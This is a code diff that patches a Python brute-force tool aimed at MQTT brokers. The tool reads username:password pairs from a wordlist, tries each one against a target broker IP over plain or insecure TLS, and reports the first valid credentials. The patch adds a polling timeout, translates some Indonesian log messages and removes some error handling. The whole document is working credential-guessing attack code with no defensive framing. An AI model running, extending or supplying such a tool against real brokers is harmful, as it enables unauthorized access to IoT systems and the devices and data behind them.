@@ -12,8 +12,6 @@ class BruteForcer:
     def log(self, message):
         if self.logger:
             self.logger(message)
-        else:
-            print(message)
 
     def brute_force(self, broker_ip, port=1883, use_tls=False):
         """Melakukan brute force terhadap broker MQTT."""
@@ -21,43 +19,46 @@ class BruteForcer:
             self.log("[!] Wordlist tidak ditemukan!")
             return None
 
-        try:
-            with open(self.wordlist_path, encoding='utf-8', errors='ignore') as f:
-                creds = [line.strip().split(":") for line in f if ":" in line]
-        except Exception as e:
-            self.log(f"[!] Gagal membaca wordlist: {e}")
-            return None
+        with open(self.wordlist_path, encoding='utf-8', errors='ignore') as f:
+            creds = [line.strip().split(":") for line in f if ":" in line]
 
         for username, password in creds:
+            success = {"ok": None}
+
+            def on_connect(client, userdata, flags, rc):
+                if rc == 0:
+                    success["ok"] = True
+                else:
+                    success["ok"] = False
+
+            client = mqtt.Client()
+            client.username_pw_set(username, password)
+            client.on_connect = on_connect
+
+            if use_tls:
+                setup_tls_context(client, allow_insecure=True, logger=self.logger)
+
             try:
-                success = {"ok": False}
-
-                def on_connect(client, userdata, flags, rc):
-                    success["ok"] = (rc == 0)
-
-                client = mqtt.Client()
-                client.username_pw_set(username, password)
-                client.on_connect = on_connect
-
-                if use_tls:
-                    client.tls_set_context(setup_tls_context())
-
                 client.connect(broker_ip, port, 5)
                 client.loop_start()
-                time.sleep(2)
+
+                timeout = 0
+                while success["ok"] is None and timeout < 5:
+                    time.sleep(0.2)
+                    timeout += 0.2
+
                 client.loop_stop()
                 client.disconnect()
 
-                if success["ok"]:
+                if success["ok"] is True:
                     self.found_credential = (username, password)
-                    self.log(f"[✓] Kredensial valid: {username}:{password}")
+                    self.log(f"[✓] Valid credentials: {username}:{password}")
                     return self.found_credential
                 else:
-                    self.log(f"[-] Kredensial salah: {username}:{password}")
+                    self.log(f"[-] Invalid: {username}:{password}")
 
             except Exception as e:
-                self.log(f"[!] Error koneksi untuk {username}:{password} → {e}")
-                continue  # lanjut ke kredensial berikutnya
+                self.log(f"[!] Error koneksi: {e}")
+                continue
 
-        self.log("[!] Tidak ada kredensial yang berhasil.")
         return None
